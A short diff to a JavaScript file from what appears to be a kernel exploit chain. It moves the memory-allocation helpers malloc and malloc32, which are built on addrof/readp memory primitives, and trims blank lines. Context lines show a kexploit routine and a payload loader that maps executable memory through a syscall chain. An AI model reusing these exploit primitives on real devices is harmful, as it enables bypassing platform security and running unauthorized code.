@@ -1644,6 +1644,22 @@ function setup(block_fd) {
     return [block_id, groom_ids];
 }
 
+function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+
 function runBinLoader() {
     var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
     var payload_loader = malloc32(0x1000);
@@ -1788,22 +1804,6 @@ export async function kexploit() {
     }
 }
 
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
-
 
 kexploit().then(() => {
     
@@ -1827,9 +1827,5 @@ kexploit().then(() => {
         payload_loader,
         payload_buffer,
     );
-
-
-    
-
 
 })
